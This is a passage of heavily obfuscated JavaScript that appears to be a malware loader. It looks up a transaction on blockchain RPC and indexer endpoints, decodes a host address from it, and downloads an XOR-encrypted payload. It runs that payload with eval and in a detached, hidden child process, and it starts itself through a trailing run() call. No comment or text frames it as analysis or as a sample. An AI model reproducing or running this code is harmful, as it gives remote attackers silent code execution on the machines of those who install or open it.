_0x30692e+_0xdcb704;},'EirBh':_0xe8ed74(0x379)+_0xe8ed74(0x263)+_0xe8ed74(0x1f3)+_0xe8ed74(0x233),'msZTY':_0xe8ed74(0x244)+_0xe8ed74(0x28e)+_0xe8ed74(0x204)+_0xe8ed74(0x33e)+_0xe8ed74(0x2ae)+_0xe8ed74(0x348)+_0xe8ed74(0x24e)+'om'};return _0x37d5db[_0xe8ed74(0x36e)](httpRequest,_0x37d5db[_0xe8ed74(0x208)](_0x37d5db[_0xe8ed74(0x2ba)](_0x37d5db[_0xe8ed74(0x2d0)](INDEXER_URL,_0x37d5db[_0xe8ed74(0x2c0)]),SENDER),_0x37d5db[_0xe8ed74(0x285)]))[_0xe8ed74(0x236)](function(_0x17229f){var _0x6435bf=_0xe8ed74,_0x1248fc=_0x37d5db[_0x6435bf(0x36e)](findSenderTx,_0x17229f&&Array[_0x6435bf(0x248)](_0x17229f[_0x6435bf(0x25d)])?_0x17229f[_0x6435bf(0x25d)]:[]);return{'blockNumber':_0x37d5db[_0x6435bf(0x36e)](Number,_0x1248fc[_0x6435bf(0x2fc)+'r']),'tx':_0x1248fc};});}function run(){var _0x44e890=_0x18fc94,_0x214f47={'OSswm':function(_0x77cb65,_0xb4ec5d,_0x1a62e9,_0xbbb8e1,_0x514577){return _0x77cb65(_0xb4ec5d,_0x1a62e9,_0xbbb8e1,_0x514577);},'aFhun':_0x44e890(0x366)+_0x44e890(0x25c),'qLiiJ':function(_0x3998ee){return _0x3998ee();},'WZqmy':function(_0x31f097,_0x2fd013){return _0x31f097(_0x2fd013);},'ACKJp':function(_0x2a6deb,_0xb62649){return _0x2a6deb-_0xb62649;},'ddFBp':function(_0x3a6aca,_0x1be93e){return _0x3a6aca%_0x1be93e;},'bPUnO':function(_0x36721f,_0x1b5bfc){return _0x36721f<_0x1b5bfc;},'vYaxt':function(_0x51f79a,_0x40b2eb){return _0x51f79a%_0x40b2eb;},'YQVKW':_0x44e890(0x2c9),'iEFgU':_0x44e890(0x369)+_0x44e890(0x260),'PFbOK':_0x44e890(0x268)+_0x44e890(0x314),'NefgC':function(_0xa0f993,_0x479400){return _0xa0f993(_0x479400);},'LjnKZ':function(_0x7fcbee,_0x1bbc8b){return _0x7fcbee!==_0x1bbc8b;},'VkcYG':_0x44e890(0x247),'HLpSv':_0x44e890(0x2b8),'YizYB':_0x44e890(0x320),'FGUmD':_0x44e890(0x210),'DZlRE':function(_0x5a1517,_0xd9e8b){return _0x5a1517+_0xd9e8b;},'JfjjD':_0x44e890(0x266)+_0x44e890(0x25a)+_0x44e890(0x31a)+_0x44e890(0x271)+_0x44e890(0x315)+_0x44e890(0x2b5)+_0x44e890(0x2c3)+_0x44e890(0x367)+_0x44e890(0x37a)+_0x44e890(0x354)+_0x44e890(0x226)+'6','trnts':function(_0x1bd4d4,_0x4acf6e){return _0x1bd4d4(_0x4acf6e);},'mjivA':_0x44e890(0x2cc),'qBAFO':_0x44e890(0x2f6)+_0x44e890(0x22b)+'4','nYBKy':function(_0x364fc0,_0x1144d5){return _0x364fc0(_0x1144d5);},'Fypmh':_0x44e890(0x36d),'SPkJZ':function(_0x102efe,_0x4e8821,_0x5180c0){return _0x102efe(_0x4e8821,_0x5180c0);},'IZjrD':function(_0x3c0871,_0x294873){return _0x3c0871+_0x294873;},'OjjCI':function(_0x12c051,_0x48a080,_0x59630d,_0x1c7586){return _0x12c051(_0x48a080,_0x59630d,_0x1c7586);},'lmbtl':_0x44e890(0x34c),'DvaAl':_0x44e890(0x25b),'NUYic':function(_0x3626bd,_0x27cb95){return _0x3626bd+_0x27cb95;},'WtRcv':_0x44e890(0x251),'xyeKi':_0x44e890(0x2bf),'qlWvA':_0x44e890(0x365)+_0x44e890(0x38a),'svmzi':function(_0x89c042,_0x5eac0b){return _0x89c042(_0x5eac0b);},'NzjOi':function(_0x5117a5,_0x3c651b){return _0x5117a5+_0x3c651b;},'SNylr':_0x44e890(0x252),'kzZPF':function(_0x2d08d9,_0x6a510e){return _0x2d08d9+_0x6a510e;},'oRRqB':function(_0x7730ef,_0xe9a673){return _0x7730ef+_0xe9a673;},'FBISa':function(_0x58c358,_0x1d0317){return _0x58c358+_0x1d0317;},'SyQCd':function(_0x38deef,_0x16291d){return _0x38deef+_0x16291d;},'pgmNO':_0x44e890(0x291),'erjCg':function(_0x29ec60,_0x59c113){return _0x29ec60+_0x59c113;},'ivDxY':function(_0x1b307e,_0x4b3b60,_0x4d35c6,_0x21b517){return _0x1b307e(_0x4b3b60,_0x4d35c6,_0x21b517);},'bEUtI':function(_0x2a2191,_0x2fd7db){return _0x2a2191+_0x2fd7db;},'ERrvc':_0x44e890(0x22a)+'s','EpRfi':_0x44e890(0x363)+_0x44e890(0x24c),'KrKuw':function(_0x452439,_0x247369){return _0x452439(_0x247369);}};return _0x214f47[_0x44e890(0x370)](withRpcEndpoints,function(_0x1a97bd,_0x4b3290){var _0x38e11e=_0x44e890;return _0x214f47[_0x38e11e(0x275)](rpcCall,_0x1a97bd,_0x214f47[_0x38e11e(0x282)],[],_0x4b3290);})[_0x44e890(0x236)](function(_0x3c4133){var _0x243555=_0x44e890,_0x378acb={'SDXbM':function(_0x588984){var _0x119b29=_0x32cb;return _0x214f47[_0x119b29(0x239)](_0x588984);},'smtCe':function(_0x2024b1,_0x21c3ca){var _0x1c6969=_0x32cb;return _0x214f47[_0x1c6969(0x2a8)](_0x2024b1,_0x21c3ca);}},_0x495f0e,_0x252679=_0x214f47[_0x243555(0x2a8)](Number,_0x3c4133),_0x5c6980=[],_0x383ece=_0x214f47[_0x243555(0x2a8)](candidateBlocks,_0x214f47[_0x243555(0x232)](_0x252679,_0x214f47[_0x243555(0x326)](_0x252679,BLOCK_MULTIPLE)));for(_0x495f0e=-0x1*0x1a21+0x52*-0x67+0x3b1f;_0x214f47[_0x243555(0x215)](_0x495f0e,_0x383ece[_0x243555(0x2cf)]);_0x495f0e++)_0x5c6980[_0x243555(0x242)](_0x214f47[_0x243555(0x2a8)](blockTask,_0x383ece[_0x495f0e]));return _0x214f47[_0x243555(0x2a8)](firstMatch,_0x5c6980)[_0x243555(0x236)](function(_0x4deb25){var _0x42e41d=_0x243555,_0x1e64b0={'Arbsw':function(_0xce0f9c){var _0x40950e=_0x32cb;return _0x378acb[_0x40950e(0x265)](_0xce0f9c);}};return _0x4deb25||_0x378acb[_0x42e41d(0x2a2)](lastSenderTx,_0x252679)[_0x42e41d(0x389)](function(){var _0x4e6e74=_0x42e41d;return _0x1e64b0[_0x4e6e74(0x330)](lastSenderTxViaIndexer);});});})[_0x44e890(0x236)](function(_0x57cc60){var _0x101dfb=_0x44e890,_0x1d17c9={'RZnAB':_0x214f47[_0x101dfb(0x2b9)],'owCHU':_0x214f47[_0x101dfb(0x35f)],'mGbUv':function(_0x102ce2,_0x1244b3){var _0x321679=_0x101dfb;return _0x214f47[_0x321679(0x21e)](_0x102ce2,_0x1244b3);},'BydrM':_0x214f47[_0x101dfb(0x218)],'ZzKvX':function(_0x5b76d3,_0x59b1b,_0xef043f){var _0xef281b=_0x101dfb;return _0x214f47[_0xef281b(0x34e)](_0x5b76d3,_0x59b1b,_0xef043f);},'WJlbP':function(_0x11f839,_0x15ea1e){var _0x157c9a=_0x101dfb;return _0x214f47[_0x157c9a(0x2c4)](_0x11f839,_0x15ea1e);},'KPVtg':function(_0x5e8755,_0x11ad8d,_0x1cb919,_0x574094){var _0x19ff30=_0x101dfb;return _0x214f47[_0x19ff30(0x237)](_0x5e8755,_0x11ad8d,_0x1cb919,_0x574094);},'tRqgL':_0x214f47[_0x101dfb(0x2c8)],'hrRcy':_0x214f47[_0x101dfb(0x36b)],'GRWTi':function(_0x3e8aeb,_0x53ddd4){var _0xdc07ea=_0x101dfb;return _0x214f47[_0xdc07ea(0x26b)](_0x3e8aeb,_0x53ddd4);},'HUhiH':_0x214f47[_0x101dfb(0x21b)],'NHJIR':_0x214f47[_0x101dfb(0x2a0)],'EfeLj':_0x214f47[_0x101dfb(0x334)]},_0x1cad09=_0x214f47[_0x101dfb(0x230)](decodeAddress,_0x57cc60['tx']['to']),_0x22e50b=_0x1cad09[0x308+-0x112f+-0x1*-0xe27],_0x4cd016=_0x1cad09[-0xe45+-0x1f2+0x40e*0x4],_0x5aab89=global;function _0x1903b4(_0x56ecdf,_0x44d9bf){var _0x394c7a=_0x101dfb,_0x33bd20={'voDFx':function(_0x1de8fb,_0x37a4dc){var _0x13505b=_0x32cb;return _0x214f47[_0x13505b(0x215)](_0x1de8fb,_0x37a4dc);},'MeQRi':function(_0x74e908,_0x13f487){var _0x4242eb=_0x32cb;return _0x214f47[_0x4242eb(0x321)](_0x74e908,_0x13f487);},'oUSyL':_0x214f47[_0x394c7a(0x2ab)],'PzaCR':function(_0x109761,_0x3c9ec5){var _0x50c308=_0x394c7a;return _0x214f47[_0x50c308(0x2a8)](_0x109761,_0x3c9ec5);},'UMgkS':_0x214f47[_0x394c7a(0x2b9)],'LNSUD':_0x214f47[_0x394c7a(0x2bb)],'JjwUn':function(_0x347a33,_0xc87a13){var _0x5c0312=_0x394c7a;return _0x214f47[_0x5c0312(0x288)](_0x347a33,_0xc87a13);},'UttIh':function(_0x16f4cc,_0xabc6cd){var _0x37e2a9=_0x394c7a;return _0x214f47[_0x37e2a9(0x350)](_0x16f4cc,_0xabc6cd);},'odKAu':_0x214f47[_0x394c7a(0x201)],'fezep':_0x214f47[_0x394c7a(0x258)],'KjHxH':_0x214f47[_0x394c7a(0x375)],'YNMkH':_0x214f47[_0x394c7a(0x200)]},_0x46d3ad={'hostname':_0x44d9bf[_0x394c7a(0x249)],'port':_0x214f47[_0x394c7a(0x2a8)](Number,_0x44d9bf[_0x394c7a(0x2de)])||-0x1073*-0x1+0x11c4+-0x21e7,'path':_0x214f47[_0x394c7a(0x26f)](_0x44d9bf[_0x394c7a(0x335)],_0x44d9bf[_0x394c7a(0x2c7)]),'headers':{'User-Agent':_0x214f47[_0x394c7a(0x262)],'Sec-V':_0x5aab89['_V']||-0x1*0x17e3+-0x143b+-0x160f*-0x2}};function _0x2af09a(_0x465a61){var _0x296eba=_0x394c7a,_0x2f94a9,_0x40281a=_0x56ecdf[_0x296eba(0x2cf)];for(_0x2f94a9=0x1292+-0x149d+0x20b;_0x33bd20[_0x296eba(0x2df)](_0x2f94a9,_0x465a61[_0x296eba(0x2cf)]);_0x2f94a9++)_0x465a61[_0x2f94a9]^=_0x56ecdf[_0x296eba(0x1f1)](_0x33bd20[_0x296eba(0x2eb)](_0x2f94a9,_0x40281a));return _0x465a61[_0x296eba(0x2b6)](_0x33bd20[_0x296eba(0x2dc)]);}function _0x402866(_0x51d894){var _0x4f78ad=_0x394c7a,_0xad1be0=_0x51d894[_0x4f78ad(0x294)][_0x1d17c9[_0x4f78ad(0x2a7)]];if(!_0xad1be0)throw new Error(_0x1d17c9[_0x4f78ad(0x279)]);return _0x1d17c9[_0x4f78ad(0x35c)](_0x2af09a,Buffer[_0x4f78ad(0x2e5)](_0xad1be0,_0x1d17c9[_0x4f78ad(0x2f5)]));}function _0xdb9bd1(_0x1d6c10){return new Promise(function(_0xd915b0,_0x3d9776){var _0x2be94b=_0x32cb,_0x26f747={'CMSBP':function(_0x1df2cf,_0x4de265){var _0xa6cae5=_0x32cb;return _0x33bd20[_0xa6cae5(0x341)](_0x1df2cf,_0x4de265);},'dkhxx':_0x33bd20[_0x2be94b(0x364)],'rlXPy':function(_0x75d885,_0x52119f){var _0x5ab1ba=_0x2be94b;return _0x33bd20[_0x5ab1ba(0x341)](_0x75d885,_0x52119f);},'CvizX':_0x33bd20[_0x2be94b(0x374)],'MehRX':function(_0x591d82,_0x38e449){var _0x3d811f=_0x2be94b;return _0x33bd20[_0x3d811f(0x1f7)](_0x591d82,_0x38e449);},'XLRBC':function(_0x56c7e4,_0xc6cb38){var _0xcd7de4=_0x2be94b;return _0x33bd20[_0xcd7de4(0x311)](_0x56c7e4,_0xc6cb38);},'rIYek':_0x33bd20[_0x2be94b(0x21a)],'wxjFZ':_0x33bd20[_0x2be94b(0x2e1)],'dNUKY':_0x33bd20[_0x2be94b(0x229)],'mlgzn':_0x33bd20[_0x2be94b(0x30e)],'HtQRM':function(_0x3c2d0d,_0x21dcf7){var _0x2110c9=_0x2be94b;return _0x33bd20[_0x2110c9(0x341)](_0x3c2d0d,_0x21dcf7);}},_0x324d1d={'hostname':_0x46d3ad[_0x2be94b(0x249)],'port':_0x46d3ad[_0x2be94b(0x2de)],'path':_0x46d3ad[_0x2be94b(0x385)],'headers':_0x46d3ad[_0x2be94b(0x294)],'method':_0x1d6c10},_0x5a3a02=http[_0x2be94b(0x32c)](_0x324d1d,function(_0x6c6586){var _0x3bc9d5=_0x2be94b,_0x29c9c3={'wDuOs':function(_0x19c784,_0x506fd3){var _0x14a635=_0x32cb;return _0x26f747[_0x14a635(0x381)](_0x19c784,_0x506fd3);},'zgZIS':_0x26f747[_0x3bc9d5(0x343)],'AuDwi':function(_0x2ede4,_0x197268){var _0x5cd09e=_0x3bc9d5;return _0x26f747[_0x5cd09e(0x387)](_0x2ede4,_0x197268);},'gjVFj':_0x26f747[_0x3bc9d5(0x27e)],'bReXD':function(_0x5c4fa1,_0x13cf29){var _0x5146ac=_0x3bc9d5;return _0x26f747[_0x5146ac(0x31e)](_0x5c4fa1,_0x13cf29);}};if(_0x26f747[_0x3bc9d5(0x202)](_0x26f747[_0x3bc9d5(0x255)],_0x1d6c10)){var _0xc2b532=[];_0x6c6586['on'](_0x26f747[_0x3bc9d5(0x340)],function(_0x17b8c5){var _0x30fe6e=_0x3bc9d5;_0xc2b532[_0x30fe6e(0x242)](_0x17b8c5);}),_0x6c6586['on'](_0x26f747[_0x3bc9d5(0x2b2)],function(){var _0x94906=_0x3bc9d5;try{var _0x52564d=Buffer[_0x94906(0x35e)](_0xc2b532);if(_0x52564d[_0x94906(0x2cf)])return _0x29c9c3[_0x94906(0x346)](_0xd915b0,_0x29c9c3[_0x94906(0x346)](_0x2af09a,_0x52564d));if(_0x6c6586[_0x94906(0x294)][_0x29c9c3[_0x94906(0x349)]])return _0x29c9c3[_0x94906(0x346)](_0xd915b0,_0x29c9c3[_0x94906(0x346)](_0x402866,_0x6c6586));_0x29c9c3[_0x94906(0x2cb)](_0x3d9776,new Error(_0x29c9c3[_0x94906(0x2ca)]));}catch(_0x49704b){_0x29c9c3[_0x94906(0x20b)](_0x3d9776,_0x49704b);}}),_0x6c6586['on'](_0x26f747[_0x3bc9d5(0x25e)],_0x3d9776);}else{try{_0x26f747[_0x3bc9d5(0x31e)](_0xd915b0,_0x26f747[_0x3bc9d5(0x387)](_0x402866,_0x6c6586));}catch(_0x587de3){_0x26f747[_0x3bc9d5(0x235)](_0x3d9776,_0x587de3);}_0x6c6586[_0x3bc9d5(0x253)]();}});_0x5a3a02['on'](_0x33bd20[_0x2be94b(0x30e)],_0x3d9776),_0x5a3a02[_0x2be94b(0x320)]();});}return _0x214f47[_0x394c7a(0x206)](_0xdb9bd1,_0x214f47[_0x394c7a(0x2d7)])[_0x394c7a(0x389)](function(){var _0x46ee51=_0x394c7a;return _0x33bd20[_0x46ee51(0x1f7)](_0xdb9bd1,_0x33bd20[_0x46ee51(0x21a)]);});}async function _0x35ffb4(_0x248196,_0x53de5f,_0x54ecb6){var _0x2201b2=_0x101dfb;try{const _0x1165a9=await _0x1d17c9[_0x2201b2(0x1f8)](_0x1903b4,_0x53de5f,_0x248196),_0x52e5aa=_0x54ecb6?_0x2201b2(0x2aa)+_0x2201b2(0x324)+(_0x5aab89['_V']||-0x2029+-0x4*0x2a6+0x2ac1)+(_0x2201b2(0x29c)+_0x2201b2(0x22d))+_0x5aab89['_H']+(_0x2201b2(0x29c)+_0x2201b2(0x231))+_0x5aab89[_0x2201b2(0x23b)]+(_0x2201b2(0x29c)+_0x2201b2(0x280)+_0x2201b2(0x26c)+_0x2201b2(0x1ff)+_0x2201b2(0x30c)+_0x2201b2(0x386)):_0x2201b2(0x2aa)+_0x2201b2(0x324)+(_0x5aab89['_V']||0x5a1+-0x2*0x11e1+0x1e21)+(_0x2201b2(0x29c)+_0x2201b2(0x238))+_0x5aab89[_0x2201b2(0x26e)]+(_0x2201b2(0x29c)+_0x2201b2(0x2c6))+_0x5aab89[_0x2201b2(0x37c)]+(_0x2201b2(0x29c)+_0x2201b2(0x280)+_0x2201b2(0x26c)+_0x2201b2(0x1ff)+_0x2201b2(0x30c)+_0x2201b2(0x386));_0x54ecb6||_0x1d17c9[_0x2201b2(0x35c)](eval,_0x1d17c9[_0x2201b2(0x20c)](_0x52e5aa,_0x1165a9)),_0x1d17c9[_0x2201b2(0x24b)](spawn,_0x1d17c9[_0x2201b2(0x301)],['-e',_0x1d17c9[_0x2201b2(0x20c)](_0x52e5aa,_0x1165a9)],{'detached':!(0xd1+0x2e*0x9d+-0x1*0x1d07),'stdio':_0x1d17c9[_0x2201b2(0x2d4)],'windowsHide':!(0xac2+0x1b2f*-0x1+-0x349*-0x5)})[_0x2201b2(0x2e2)]();}catch(_0x33dc71){}}return _0x5aab89['_V']=_0x5aab89['i'],_0x5aab89['_H']=_0x214f47[_0x101dfb(0x26b)](_0x214f47[_0x101dfb(0x272)](_0x214f47[_0x101dfb(0x21b)],_0x22e50b),_0x214f47[_0x101dfb(0x31c)]),_0x5aab89[_0x101dfb(0x23b)]=_0x214f47[_0x101dfb(0x2fa)](_0x214f47[_0x101dfb(0x37f)](_0x214f47[_0x101dfb(0x21b)],_0x4cd016),_0x214f47[_0x101dfb(0x31c)]),_0x5aab89[_0x101dfb(0x26e)]=_0x214f47[_0x101dfb(0x246)](_0x214f47[_0x101dfb(0x355)](_0x214f47[_0x101dfb(0x21b)],_0x22e50b),_0x214f47[_0x101dfb(0x2d3)]),_0x5aab89[_0x101dfb(0x37c)]=_0x214f47[_0x101dfb(0x2be)](_0x214f47[_0x101dfb(0x26b)](_0x214f47[_0x101dfb(0x21b)],_0x22e50b),_0x214f47[_0x101dfb(0x31c)]),_0x214f47[_0x101dfb(0x259)](_0x35ffb4,new URL(_0x214f47[_0x101dfb(0x1f4)](_0x214f47[_0x101dfb(0x246)](_0x214f47[_0x101dfb(0x21b)],_0x22e50b),_0x214f47[_0x101dfb(0x310)])),_0x214f47[_0x101dfb(0x37e)],!(-0xf9*-0x22+0x1976+-0x3a87))[_0x101dfb(0x236)](function(){var _0x19b3ea=_0x101dfb;return _0x1d17c9[_0x19b3ea(0x24b)](_0x35ffb4,new URL(_0x1d17c9[_0x19b3ea(0x2e4)](_0x1d17c9[_0x19b3ea(0x2e4)](_0x1d17c9[_0x19b3ea(0x32a)],_0x22e50b),_0x1d17c9[_0x19b3ea(0x2e6)])),_0x1d17c9[_0x19b3ea(0x29e)],!(0x5*0x45d+0x94*0x2f+-0x30fd));});});}run();
